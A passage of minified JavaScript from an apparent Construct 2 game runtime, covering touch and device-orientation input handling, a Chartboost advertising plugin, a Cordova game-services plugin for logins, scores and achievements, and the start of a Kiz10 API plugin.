        }, e.onTouchMove = function (t) {
            t.preventDefault && t.preventDefault();
            var e, n, r, s, o = cr.performance_now();
            for (e = 0, n = t.changedTouches.length; e < n; e++) {
                r = t.changedTouches[e];
                var a = this.findTouch(r.identifier);
                if (a >= 0) {
                    var h = this.runtime.isDomFree ? i : jQuery(this.runtime.canvas).offset();
                    if (o - (s = this.touches[a]).time < 2) continue;
                    var c = 2 * (r.radiusX || r.webkitRadiusX || r.mozRadiusX || r.msRadiusX || 0),
                        l = 2 * (r.radiusY || r.webkitRadiusY || r.mozRadiusY || r.msRadiusY || 0),
                        u = r.force || r.webkitForce || r.mozForce || r.msForce || 0;
                    s.update(o, r.pageX - h.left, r.pageY - h.top, c, l, u)
                }
            }
        }, e.onTouchStart = function (t) {
            t.preventDefault && cr.isCanvasInputEvent(t) && t.preventDefault();
            var e, n, r, s = this.runtime.isDomFree ? i : jQuery(this.runtime.canvas).offset();
            cr.performance_now();
            for (this.runtime.isInUserInputEvent = !0, e = 0, n = t.changedTouches.length; e < n; e++)
                if (r = t.changedTouches[e], -1 === this.findTouch(r.identifier)) {
                    var o = r.pageX - s.left,
                        a = r.pageY - s.top;
                    this.trigger_index = this.touches.length, this.trigger_id = r.identifier, this.touches.push(h(o, a, r.identifier, this.trigger_index)), this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnNthTouchStart, this), this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnTouchStart, this), this.curTouchX = o, this.curTouchY = a, this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnTouchObject, this)
                } this.runtime.isInUserInputEvent = !1
        }, e.onTouchEnd = function (t, e) {
            var i, n, r, s;
            for (t.preventDefault && cr.isCanvasInputEvent(t) && t.preventDefault(), this.runtime.isInUserInputEvent = !0, i = 0, n = t.changedTouches.length; i < n; i++) r = t.changedTouches[i], (s = this.findTouch(r.identifier)) >= 0 && (this.trigger_index = this.touches[s].startindex, this.trigger_id = this.touches[s].id, this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnNthTouchEnd, this), this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnTouchEnd, this), e || this.touches[s].maybeTriggerTap(this, s), c(this.touches[s]), this.touches.splice(s, 1));
            this.runtime.isInUserInputEvent = !1
        }, e.getAlpha = function () {
            return this.runtime.isCordova && 0 === this.orient_alpha && 0 !== s ? 90 * s : this.orient_alpha
        }, e.getBeta = function () {
            return this.runtime.isCordova && 0 === this.orient_beta && 0 !== r ? 90 * r : this.orient_beta
        }, e.getGamma = function () {
            return this.runtime.isCordova && 0 === this.orient_gamma && 0 !== n ? 90 * n : this.orient_gamma
        };

        function f(t) {
            return t.sourceCapabilities && t.sourceCapabilities.firesTouchEvents || t.originalEvent && t.originalEvent.sourceCapabilities && t.originalEvent.sourceCapabilities.firesTouchEvents
        }

        function m() {}
        e.onMouseDown = function (t) {
            if (!f(t)) {
                var e = {
                    changedTouches: [{
                        pageX: t.pageX,
                        pageY: t.pageY,
                        identifier: 0
                    }]
                };
                this.onTouchStart(e), this.mouseDown = !0
            }
        }, e.onMouseMove = function (t) {
            if (this.mouseDown && !f(t)) {
                var e = {
                    changedTouches: [{
                        pageX: t.pageX,
                        pageY: t.pageY,
                        identifier: 0
                    }]
                };
                this.onTouchMove(e)
            }
        }, e.onMouseUp = function (t) {
            if (t.preventDefault && this.runtime.had_a_click && !this.runtime.isMobile && t.preventDefault(), this.runtime.had_a_click = !0, !f(t)) {
                var e = {
                    changedTouches: [{
                        pageX: t.pageX,
                        pageY: t.pageY,
                        identifier: 0
                    }]
                };
                this.onTouchEnd(e), this.mouseDown = !1
            }
        }, e.tick2 = function () {
            var t, e, i, n = cr.performance_now();
            for (t = 0, e = this.touches.length; t < e; ++t)(i = this.touches[t]).time <= n - 50 && (i.lasttime = n), i.maybeTriggerHold(this, t)
        }, m.prototype.OnTouchStart = function () {
            return !0
        }, m.prototype.OnTouchEnd = function () {
            return !0
        }, m.prototype.IsInTouch = function () {
            return this.touches.length
        }, m.prototype.OnTouchObject = function (t) {
            return !!t && this.runtime.testAndSelectCanvasPointOverlap(t, this.curTouchX, this.curTouchY, !1)
        };
        var g = [];

        function y() {}
        m.prototype.IsTouchingObject = function (t) {
            if (!t) return !1;
            var e, i, n, r, s, o, a = t.getCurrentSol(),
                h = a.getObjects();
            for (n = 0, r = h.length; n < r; n++) {
                var c = h[n];
                for (c.update_bbox(), s = 0, o = this.touches.length; s < o; s++) {
                    var l = this.touches[s];
                    if (e = c.layer.canvasToLayer(l.x, l.y, !0), i = c.layer.canvasToLayer(l.x, l.y, !1), c.contains_pt(e, i)) {
                        g.push(c);
                        break
                    }
                }
            }
            return !!g.length && (a.select_all = !1, cr.shallowAssignArray(a.instances, g), t.applySolToContainer(), cr.clearArray(g), !0)
        }, m.prototype.CompareTouchSpeed = function (t, e, i) {
            if ((t = Math.floor(t)) < 0 || t >= this.touches.length) return !1;
            var n = this.touches[t],
                r = cr.distanceTo(n.x, n.y, n.lastx, n.lasty),
                s = (n.time - n.lasttime) / 1e3,
                o = 0;
            return s > 0 && (o = r / s), cr.do_cmp(o, e, i)
        }, m.prototype.OrientationSupported = function () {
            return void 0 !== window.DeviceOrientationEvent
        }, m.prototype.MotionSupported = function () {
            return void 0 !== window.DeviceMotionEvent
        }, m.prototype.CompareOrientation = function (t, e, i) {
            var n = 0;
            return n = 0 === t ? this.getAlpha() : 1 === t ? this.getBeta() : this.getGamma(), cr.do_cmp(n, e, i)
        }, m.prototype.CompareAcceleration = function (t, e, i) {
            var n = 0;
            return 0 === t ? n = this.acc_g_x : 1 === t ? n = this.acc_g_y : 2 === t ? n = this.acc_g_z : 3 === t ? n = this.acc_x : 4 === t ? n = this.acc_y : 5 === t && (n = this.acc_z), cr.do_cmp(n, e, i)
        }, m.prototype.OnNthTouchStart = function (t) {
            return (t = Math.floor(t)) === this.trigger_index
        }, m.prototype.OnNthTouchEnd = function (t) {
            return (t = Math.floor(t)) === this.trigger_index
        }, m.prototype.HasNthTouch = function (t) {
            return t = Math.floor(t), this.touches.length >= t + 1
        }, m.prototype.OnHoldGesture = function () {
            return !0
        }, m.prototype.OnTapGesture = function () {
            return !0
        }, m.prototype.OnDoubleTapGesture = function () {
            return !0
        }, m.prototype.OnHoldGestureObject = function (t) {
            return !!t && this.runtime.testAndSelectCanvasPointOverlap(t, this.curTouchX, this.curTouchY, !1)
        }, m.prototype.OnTapGestureObject = function (t) {
            return !!t && this.runtime.testAndSelectCanvasPointOverlap(t, this.curTouchX, this.curTouchY, !1)
        }, m.prototype.OnDoubleTapGestureObject = function (t) {
            return !!t && this.runtime.testAndSelectCanvasPointOverlap(t, this.curTouchX, this.curTouchY, !1)
        }, t.cnds = new m, y.prototype.TouchCount = function (t) {
            t.set_int(this.touches.length)
        }, y.prototype.X = function (t, e) {
            var i, n, r, s, o, a = this.getTouchIndex;
            a < 0 || a >= this.touches.length ? t.set_float(0) : cr.is_undefined(e) ? (n = (i = this.runtime.getLayerByNumber(0)).scale, r = i.zoomRate, s = i.parallaxX, o = i.angle, i.scale = 1, i.zoomRate = 1, i.parallaxX = 1, i.angle = 0, t.set_float(i.canvasToLayer(this.touches[a].x, this.touches[a].y, !0)), i.scale = n, i.zoomRate = r, i.parallaxX = s, i.angle = o) : (i = cr.is_number(e) ? this.runtime.getLayerByNumber(e) : this.runtime.getLayerByName(e)) ? t.set_float(i.canvasToLayer(this.touches[a].x, this.touches[a].y, !0)) : t.set_float(0)
        }, y.prototype.XAt = function (t, e, i) {
            var n, r, s, o, a;
            (e = Math.floor(e)) < 0 || e >= this.touches.length ? t.set_float(0) : cr.is_undefined(i) ? (r = (n = this.runtime.getLayerByNumber(0)).scale, s = n.zoomRate, o = n.parallaxX, a = n.angle, n.scale = 1, n.zoomRate = 1, n.parallaxX = 1, n.angle = 0, t.set_float(n.canvasToLayer(this.touches[e].x, this.touches[e].y, !0)), n.scale = r, n.zoomRate = s, n.parallaxX = o, n.angle = a) : (n = cr.is_number(i) ? this.runtime.getLayerByNumber(i) : this.runtime.getLayerByName(i)) ? t.set_float(n.canvasToLayer(this.touches[e].x, this.touches[e].y, !0)) : t.set_float(0)
        }, y.prototype.XForID = function (t, e, i) {
            var n = this.findTouch(e);
            if (n < 0) t.set_float(0);
            else {
                var r, s, o, a, h, c = this.touches[n];
                cr.is_undefined(i) ? (s = (r = this.runtime.getLayerByNumber(0)).scale, o = r.zoomRate, a = r.parallaxX, h = r.angle, r.scale = 1, r.zoomRate = 1, r.parallaxX = 1, r.angle = 0, t.set_float(r.canvasToLayer(c.x, c.y, !0)), r.scale = s, r.zoomRate = o, r.parallaxX = a, r.angle = h) : (r = cr.is_number(i) ? this.runtime.getLayerByNumber(i) : this.runtime.getLayerByName(i)) ? t.set_float(r.canvasToLayer(c.x, c.y, !0)) : t.set_float(0)
            }
        }, y.prototype.Y = function (t, e) {
            var i, n, r, s, o, a = this.getTouchIndex;
            a < 0 || a >= this.touches.length ? t.set_float(0) : cr.is_undefined(e) ? (n = (i = this.runtime.getLayerByNumber(0)).scale, r = i.zoomRate, s = i.parallaxY, o = i.angle, i.scale = 1, i.zoomRate = 1, i.parallaxY = 1, i.angle = 0, t.set_float(i.canvasToLayer(this.touches[a].x, this.touches[a].y, !1)), i.scale = n, i.zoomRate = r, i.parallaxY = s, i.angle = o) : (i = cr.is_number(e) ? this.runtime.getLayerByNumber(e) : this.runtime.getLayerByName(e)) ? t.set_float(i.canvasToLayer(this.touches[a].x, this.touches[a].y, !1)) : t.set_float(0)
        }, y.prototype.YAt = function (t, e, i) {
            var n, r, s, o, a;
            (e = Math.floor(e)) < 0 || e >= this.touches.length ? t.set_float(0) : cr.is_undefined(i) ? (r = (n = this.runtime.getLayerByNumber(0)).scale, s = n.zoomRate, o = n.parallaxY, a = n.angle, n.scale = 1, n.zoomRate = 1, n.parallaxY = 1, n.angle = 0, t.set_float(n.canvasToLayer(this.touches[e].x, this.touches[e].y, !1)), n.scale = r, n.zoomRate = s, n.parallaxY = o, n.angle = a) : (n = cr.is_number(i) ? this.runtime.getLayerByNumber(i) : this.runtime.getLayerByName(i)) ? t.set_float(n.canvasToLayer(this.touches[e].x, this.touches[e].y, !1)) : t.set_float(0)
        }, y.prototype.YForID = function (t, e, i) {
            var n = this.findTouch(e);
            if (n < 0) t.set_float(0);
            else {
                var r, s, o, a, h, c = this.touches[n];
                cr.is_undefined(i) ? (s = (r = this.runtime.getLayerByNumber(0)).scale, o = r.zoomRate, a = r.parallaxY, h = r.angle, r.scale = 1, r.zoomRate = 1, r.parallaxY = 1, r.angle = 0, t.set_float(r.canvasToLayer(c.x, c.y, !1)), r.scale = s, r.zoomRate = o, r.parallaxY = a, r.angle = h) : (r = cr.is_number(i) ? this.runtime.getLayerByNumber(i) : this.runtime.getLayerByName(i)) ? t.set_float(r.canvasToLayer(c.x, c.y, !1)) : t.set_float(0)
            }
        }, y.prototype.AbsoluteX = function (t) {
            this.touches.length ? t.set_float(this.touches[0].x) : t.set_float(0)
        }, y.prototype.AbsoluteXAt = function (t, e) {
            (e = Math.floor(e)) < 0 || e >= this.touches.length ? t.set_float(0) : t.set_float(this.touches[e].x)
        }, y.prototype.AbsoluteXForID = function (t, e) {
            var i = this.findTouch(e);
            if (i < 0) t.set_float(0);
            else {
                var n = this.touches[i];
                t.set_float(n.x)
            }
        }, y.prototype.AbsoluteY = function (t) {
            this.touches.length ? t.set_float(this.touches[0].y) : t.set_float(0)
        }, y.prototype.AbsoluteYAt = function (t, e) {
            (e = Math.floor(e)) < 0 || e >= this.touches.length ? t.set_float(0) : t.set_float(this.touches[e].y)
        }, y.prototype.AbsoluteYForID = function (t, e) {
            var i = this.findTouch(e);
            if (i < 0) t.set_float(0);
            else {
                var n = this.touches[i];
                t.set_float(n.y)
            }
        }, y.prototype.SpeedAt = function (t, e) {
            if ((e = Math.floor(e)) < 0 || e >= this.touches.length) t.set_float(0);
            else {
                var i = this.touches[e],
                    n = cr.distanceTo(i.x, i.y, i.lastx, i.lasty),
                    r = (i.time - i.lasttime) / 1e3;
                r <= 0 ? t.set_float(0) : t.set_float(n / r)
            }
        }, y.prototype.SpeedForID = function (t, e) {
            var i = this.findTouch(e);
            if (i < 0) t.set_float(0);
            else {
                var n = this.touches[i],
                    r = cr.distanceTo(n.x, n.y, n.lastx, n.lasty),
                    s = (n.time - n.lasttime) / 1e3;
                s <= 0 ? t.set_float(0) : t.set_float(r / s)
            }
        }, y.prototype.AngleAt = function (t, e) {
            if ((e = Math.floor(e)) < 0 || e >= this.touches.length) t.set_float(0);
            else {
                var i = this.touches[e];
                t.set_float(cr.to_degrees(cr.angleTo(i.lastx, i.lasty, i.x, i.y)))
            }
        }, y.prototype.AngleForID = function (t, e) {
            var i = this.findTouch(e);
            if (i < 0) t.set_float(0);
            else {
                var n = this.touches[i];
                t.set_float(cr.to_degrees(cr.angleTo(n.lastx, n.lasty, n.x, n.y)))
            }
        }, y.prototype.Alpha = function (t) {
            t.set_float(this.getAlpha())
        }, y.prototype.Beta = function (t) {
            t.set_float(this.getBeta())
        }, y.prototype.Gamma = function (t) {
            t.set_float(this.getGamma())
        }, y.prototype.AccelerationXWithG = function (t) {
            t.set_float(this.acc_g_x)
        }, y.prototype.AccelerationYWithG = function (t) {
            t.set_float(this.acc_g_y)
        }, y.prototype.AccelerationZWithG = function (t) {
            t.set_float(this.acc_g_z)
        }, y.prototype.AccelerationX = function (t) {
            t.set_float(this.acc_x)
        }, y.prototype.AccelerationY = function (t) {
            t.set_float(this.acc_y)
        }, y.prototype.AccelerationZ = function (t) {
            t.set_float(this.acc_z)
        }, y.prototype.TouchIndex = function (t) {
            t.set_int(this.trigger_index)
        }, y.prototype.TouchID = function (t) {
            t.set_float(this.trigger_id)
        }, y.prototype.WidthForID = function (t, e) {
            var i = this.findTouch(e);
            if (i < 0) t.set_float(0);
            else {
                var n = this.touches[i];
                t.set_float(n.width)
            }
        }, y.prototype.HeightForID = function (t, e) {
            var i = this.findTouch(e);
            if (i < 0) t.set_float(0);
            else {
                var n = this.touches[i];
                t.set_float(n.height)
            }
        }, y.prototype.PressureForID = function (t, e) {
            var i = this.findTouch(e);
            if (i < 0) t.set_float(0);
            else {
                var n = this.touches[i];
                t.set_float(n.pressure)
            }
        }, t.exps = new y
    }(), cr.plugins_.cranberrygame_CordovaChartboost = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.plugins_.cranberrygame_CordovaChartboost.prototype;
        t.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        };
        var e, i, n = t.Type.prototype,
            r = "",
            s = "",
            o = "";
        n.onCreate = function () {
            if (this.runtime.isBlackberry10 || this.runtime.isWindows8App || this.runtime.isWindowsPhone8 || this.runtime.isWindowsPhone81) {
                for (var t = document.getElementsByTagName("script"), e = !1, i = 0; i < t.length; i++)
                    if (-1 != t[i].src.indexOf("cordova.js") || -1 != t[i].src.indexOf("phonegap.js")) {
                        e = !0;
                        break
                    } if (!e) {
                    var n = document.createElement("script");
                    n.setAttribute("type", "text/javascript"), n.setAttribute("src", "cordova.js"), document.getElementsByTagName("head")[0].appendChild(n)
                }
            }
        }, t.Instance = function (t) {
            this.type = t, this.runtime = t.runtime
        };
        var a = t.Instance.prototype;

        function h() {}

        function c() {}

        function l() {}
        a.onCreate = function () {
            if ((this.runtime.isAndroid || this.runtime.isiOS) && void 0 !== window.chartboost && (this.runtime.isAndroid ? (e = this.properties[0], i = this.properties[1]) : this.runtime.isiOS && (e = this.properties[2], i = this.properties[3]), s = "cranberrygame@yahoo.com", o = "5c3c43739a5d02e1076cd3f6148095b3", "" != e && "" != i)) {
                var t = this;
                window.chartboost.setLicenseKey(s, o), window.chartboost.setUp(e, i), window.chartboost.onInterstitialAdPreloaded = function (e) {
                    r = e, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaChartboost.prototype.cnds.OnInterstitialAdPreloaded, t)
                }, window.chartboost.onInterstitialAdLoaded = function (e) {
                    r = e, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaChartboost.prototype.cnds.OnInterstitialAdLoaded, t)
                }, window.chartboost.onInterstitialAdShown = function (e) {
                    r = e, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaChartboost.prototype.cnds.OnInterstitialAdShown, t)
                }, window.chartboost.onInterstitialAdHidden = function (e) {
                    r = e, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaChartboost.prototype.cnds.OnInterstitialAdHidden, t)
                }, window.chartboost.onMoreAppsAdPreloaded = function (e) {
                    r = e, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaChartboost.prototype.cnds.OnMoreAppsAdPreloaded, t)
                }, window.chartboost.onMoreAppsAdLoaded = function (e) {
                    r = e, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaChartboost.prototype.cnds.OnMoreAppsAdLoaded, t)
                }, window.chartboost.onMoreAppsAdShown = function (e) {
                    r = e, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaChartboost.prototype.cnds.OnMoreAppsAdShown, t)
                }, window.chartboost.onMoreAppsAdHidden = function (e) {
                    r = e, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaChartboost.prototype.cnds.OnMoreAppsAdHidden, t)
                }, window.chartboost.onRewardedVideoAdPreloaded = function (e) {
                    r = e, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaChartboost.prototype.cnds.OnRewardedVideoAdPreloaded, t)
                }, window.chartboost.onRewardedVideoAdLoaded = function (e) {
                    r = e, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaChartboost.prototype.cnds.OnRewardedVideoAdLoaded, t)
                }, window.chartboost.onRewardedVideoAdShown = function (e) {
                    r = e, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaChartboost.prototype.cnds.OnRewardedVideoAdShown, t)
                }, window.chartboost.onRewardedVideoAdHidden = function (e) {
                    r = e, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaChartboost.prototype.cnds.OnRewardedVideoAdHidden, t)
                }, window.chartboost.onRewardedVideoAdCompleted = function (e) {
                    r = e, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaChartboost.prototype.cnds.OnRewardedVideoAdCompleted, t)
                }
            }
        }, a.draw = function (t) {}, a.drawGL = function (t) {}, h.prototype.OnInterstitialAdPreloaded = function () {
            return !0
        }, h.prototype.OnInterstitialAdLoaded = function () {
            return !0
        }, h.prototype.OnInterstitialAdShown = function () {
            return !0
        }, h.prototype.OnInterstitialAdHidden = function () {
            return !0
        }, h.prototype.OnMoreAppsAdPreloaded = function () {
            return !0
        }, h.prototype.OnMoreAppsAdLoaded = function () {
            return !0
        }, h.prototype.OnMoreAppsAdShown = function () {
            return !0
        }, h.prototype.OnMoreAppsAdHidden = function () {
            return !0
        }, h.prototype.OnRewardedVideoAdPreloaded = function () {
            return !0
        }, h.prototype.OnRewardedVideoAdLoaded = function () {
            return !0
        }, h.prototype.OnRewardedVideoAdShown = function () {
            return !0
        }, h.prototype.OnRewardedVideoAdHidden = function () {
            return !0
        }, h.prototype.OnRewardedVideoAdCompleted = function () {
            return !0
        }, h.prototype.IsShowingInterstitialAd = function () {
            return void 0 !== window.chartboost && window.chartboost.isShowingInterstitialAd()
        }, h.prototype.IsShowingMoreAppsAd = function () {
            return void 0 !== window.chartboost && window.chartboost.isShowingMoreAppsAd()
        }, h.prototype.IsShowingRewardedVideoAd = function () {
            return void 0 !== window.chartboost && window.chartboost.isShowingRewardedVideoAd()
        }, h.prototype.LoadedInterstitialAd = function () {
            return void 0 !== window.chartboost && window.chartboost.loadedInterstitialAd()
        }, h.prototype.LoadedMoreAppsAd = function () {
            return void 0 !== window.chartboost && window.chartboost.loadedMoreAppsAd()
        }, h.prototype.LoadedRewardedVideoAd = function () {
            return void 0 !== window.chartboost && window.chartboost.loadedRewardedVideoAd()
        }, t.cnds = new h, c.prototype.PreloadInterstitialAd = function (t) {
            (this.runtime.isAndroid || this.runtime.isiOS) && void 0 !== window.chartboost && "" != e && "" != i && window.chartboost.preloadInterstitialAd(t)
        }, c.prototype.ShowInterstitialAd = function (t) {
            (this.runtime.isAndroid || this.runtime.isiOS) && void 0 !== window.chartboost && "" != e && "" != i && window.chartboost.showInterstitialAd(t)
        }, c.prototype.PreloadMoreAppsAd = function (t) {
            (this.runtime.isAndroid || this.runtime.isiOS) && void 0 !== window.chartboost && "" != e && "" != i && window.chartboost.preloadMoreAppsAd(t)
        }, c.prototype.ShowMoreAppsAd = function (t) {
            (this.runtime.isAndroid || this.runtime.isiOS) && void 0 !== window.chartboost && "" != e && "" != i && window.chartboost.showMoreAppsAd(t)
        }, c.prototype.PreloadRewardedVideoAd = function (t) {
            (this.runtime.isAndroid || this.runtime.isiOS) && void 0 !== window.chartboost && "" != e && "" != i && window.chartboost.preloadRewardedVideoAd(t)
        }, c.prototype.ShowRewardedVideoAd = function (t) {
            (this.runtime.isAndroid || this.runtime.isiOS) && void 0 !== window.chartboost && "" != e && "" != i && window.chartboost.showRewardedVideoAd(t)
        }, t.acts = new c, l.prototype.Location = function (t) {
            t.set_string(r)
        }, t.exps = new l
    }(), cr.plugins_.cranberrygame_CordovaGame = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.plugins_.cranberrygame_CordovaGame.prototype;
        t.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {
            if (this.runtime.isBlackberry10 || this.runtime.isWindows8App || this.runtime.isWindowsPhone8 || this.runtime.isWindowsPhone81) {
                for (var t = document.getElementsByTagName("script"), e = !1, i = 0; i < t.length; i++)
                    if (-1 != t[i].src.indexOf("cordova.js") || -1 != t[i].src.indexOf("phonegap.js")) {
                        e = !0;
                        break
                    } if (!e) {
                    var n = document.createElement("script");
                    n.setAttribute("type", "text/javascript"), n.setAttribute("src", "cordova.js"), document.getElementsByTagName("head")[0].appendChild(n)
                }
            }
        }, t.Instance = function (t) {
            this.type = t, this.runtime = t.runtime
        };
        var e = t.Instance.prototype;

        function i() {}

        function n() {}

        function r() {}
        e.onCreate = function () {
            if ((this.runtime.isAndroid || this.runtime.isiOS) && "undefined" != typeof game) {
                var t = this;
                game.setUp(), game.onLoginSucceeded = function (e) {
                    var i = e;
                    t.playerId = i.playerId, t.playerDisplayName = i.playerDisplayName, t.curTag = game.tag, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaGame.prototype.cnds.OnLoginSucceeded, t)
                }, game.onLoginFailed = function () {
                    t.curTag = game.tag, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaGame.prototype.cnds.OnLoginFailed, t)
                }, game.onGetPlayerImageSucceeded = function (e) {
                    t.playerImageUrl = e, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaGame.prototype.cnds.OnGetPlayerImageSucceeded, t)
                }, game.onGetPlayerImageFailed = function () {
                    t.runtime.trigger(cr.plugins_.cranberrygame_CordovaGame.prototype.cnds.OnGetPlayerImageFailed, t)
                }, game.onGetPlayerScoreSucceeded = function (e) {
                    t.playerScore = e, t.curTag = game.tag, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaGame.prototype.cnds.OnGetPlayerScoreSucceeded, t)
                }, game.onGetPlayerScoreFailed = function () {
                    t.curTag = game.tag, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaGame.prototype.cnds.OnGetPlayerScoreFailed, t)
                }, game.onSubmitScoreSucceeded = function () {
                    t.curTag = game.tag, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaGame.prototype.cnds.OnSubmitScoreSucceeded, t)
                }, game.onSubmitScoreFailed = function () {
                    t.curTag = game.tag, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaGame.prototype.cnds.OnSubmitScoreFailed, t)
                }, game.onUnlockAchievementSucceeded = function () {
                    t.curTag = game.tag, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaGame.prototype.cnds.OnUnlockAchievementSucceeded, t)
                }, game.onUnlockAchievementFailed = function () {
                    t.curTag = game.tag, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaGame.prototype.cnds.OnUnlockAchievementFailed, t)
                }, game.onIncrementAchievementSucceeded = function () {
                    t.curTag = game.tag, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaGame.prototype.cnds.OnIncrementAchievementSucceeded, t)
                }, game.onIncrementAchievementFailed = function () {
                    t.curTag = game.tag, t.runtime.trigger(cr.plugins_.cranberrygame_CordovaGame.prototype.cnds.OnIncrementAchievementFailed, t)
                }, game.onResetAchievementsSucceeded = function () {
                    t.runtime.trigger(cr.plugins_.cranberrygame_CordovaGame.prototype.cnds.OnResetAchievementsSucceeded, t)
                }, game.onResetAchievementsFailed = function () {
                    t.runtime.trigger(cr.plugins_.cranberrygame_CordovaGame.prototype.cnds.OnResetAchievementsFailed, t)
                }
            }
        }, e.draw = function (t) {}, e.drawGL = function (t) {}, i.prototype.OnLoginSucceeded = function (t) {
            return cr.equals_nocase(t, this.curTag)
        }, i.prototype.OnLoginFailed = function (t) {
            return cr.equals_nocase(t, this.curTag)
        }, i.prototype.IsLoggedIn = function () {
            return !(!this.runtime.isAndroid && !this.runtime.isiOS) && ("undefined" != typeof game && game.isLoggedIn())
        }, i.prototype.OnGetPlayerImageSucceeded = function () {
            return !0
        }, i.prototype.OnGetPlayerImageFailed = function () {
            return !0
        }, i.prototype.OnGetPlayerScoreSucceeded = function (t) {
            return cr.equals_nocase(t, this.curTag)
        }, i.prototype.OnGetPlayerScoreFailed = function (t) {
            return cr.equals_nocase(t, this.curTag)
        }, i.prototype.OnSubmitScoreSucceeded = function (t) {
            return cr.equals_nocase(t, this.curTag)
        }, i.prototype.OnSubmitScoreFailed = function (t) {
            return cr.equals_nocase(t, this.curTag)
        }, i.prototype.OnUnlockAchievementSucceeded = function (t) {
            return cr.equals_nocase(t, this.curTag)
        }, i.prototype.OnUnlockAchievementFailed = function (t) {
            return cr.equals_nocase(t, this.curTag)
        }, i.prototype.OnIncrementAchievementSucceeded = function (t) {
            return cr.equals_nocase(t, this.curTag)
        }, i.prototype.OnIncrementAchievementFailed = function (t) {
            return cr.equals_nocase(t, this.curTag)
        }, i.prototype.OnResetAchievementsSucceeded = function () {
            return !0
        }, i.prototype.OnResetAchievementsFailed = function () {
            return !0
        }, t.cnds = new i, n.prototype.Login = function (t) {
            if ((this.runtime.isAndroid || this.runtime.isiOS) && "undefined" != typeof game) {
                game.login(t)
            }
        }, n.prototype.GetPlayerImage = function () {
            if ((this.runtime.isAndroid || this.runtime.isiOS) && "undefined" != typeof game) {
                game.getPlayerImage()
            }
        }, n.prototype.GetPlayerScore = function (t, e) {
            if ((this.runtime.isAndroid || this.runtime.isiOS) && "undefined" != typeof game) {
                game.getPlayerScore(t, e)
            }
        }, n.prototype.SubmitScore = function (t, e, i) {
            if ((this.runtime.isAndroid || this.runtime.isiOS) && "undefined" != typeof game) {
                game.submitScore(t, e, i)
            }
        }, n.prototype.ShowLeaderboard = function (t) {
            if ((this.runtime.isAndroid || this.runtime.isiOS) && "undefined" != typeof game) {
                game.showLeaderboard(t)
            }
        }, n.prototype.ShowLeaderboards = function () {
            if ((this.runtime.isAndroid || this.runtime.isiOS) && "undefined" != typeof game) {
                game.showLeaderboards()
            }
        }, n.prototype.UnlockAchievement = function (t, e) {
            if ((this.runtime.isAndroid || this.runtime.isiOS) && "undefined" != typeof game) {
                game.unlockAchievement(t, e)
            }
        }, n.prototype.IncrementAchievement = function (t, e, i) {
            if ((this.runtime.isAndroid || this.runtime.isiOS) && "undefined" != typeof game) {
                game.incrementAchievement(t, e, i)
            }
        }, n.prototype.ShowAchievements = function () {
            if ((this.runtime.isAndroid || this.runtime.isiOS) && "undefined" != typeof game) {
                game.showAchievements()
            }
        }, n.prototype.ResetAchievements = function () {
            if ((this.runtime.isAndroid || this.runtime.isiOS) && "undefined" != typeof game) {
                game.resetAchievements()
            }
        }, n.prototype.Logout = function () {
            if ((this.runtime.isAndroid || this.runtime.isiOS) && "undefined" != typeof game) {
                game.logout()
            }
        }, t.acts = new n, r.prototype.PlayerId = function (t) {
            t.set_string(this.playerId)
        }, r.prototype.PlayerDisplayName = function (t) {
            t.set_string(this.playerDisplayName)
        }, r.prototype.PlayerImageUrl = function (t) {
            t.set_string(this.playerImageUrl)
        }, r.prototype.PlayerScore = function (t) {
            t.set_int(this.playerScore)
        }, t.exps = new r
    }(), cr.plugins_.sirg_kiz = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.plugins_.sirg_kiz.prototype;
        t.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {}, t.Instance = function (t) {
            this.type = t, this.runtime = t.runtime
        };
        var e, i, n, r = t.Instance.prototype,
            s = 0;

        function o() {}
        r.onCreate = function () {
            this.kiz_gameid = this.properties[0], this.kiz_APIKey = this.properties[1], i = this.properties[0], n = this.properties[1];
            var t = {
                _id: 0,
                _apikey: 0,
                apiObject: function () {},
                init: function (t, i) {
                    this._id = t, this._apikey = i, this.apiObject = !1;
                    try {
                        0 == s && ((e = new _KIZ10API)._INIT(this._id, this._apikey), s = 1)
                    } catch (t) {}
                },
                submitStat: function (t, i) {
                    // e._ObjectApi || 0 == s && ((e = new _KIZ10API)._INIT(this._id, this._apikey), s = 1);
                    // try {
                        // e.submitStat(t, i)
                    // } catch (t) {}
                },
                submitAchievProgress: function (t, i) {
                    // e._ObjectApi || 0 == s && ((e = new _KIZ10API)._INIT(this._id, this._apikey), s = 1);
                    // try {
                        // e.submitAchievProgress(t, i)
                    // } catch (t) {}
                },
                apiLoaded: function () {}
            };
            // this.Kiz10API = t, this.Kiz10API.init(this.kiz_gameid, this.kiz_APIKey);
            // var r, o = 0;
            // r = setInterval((function () {
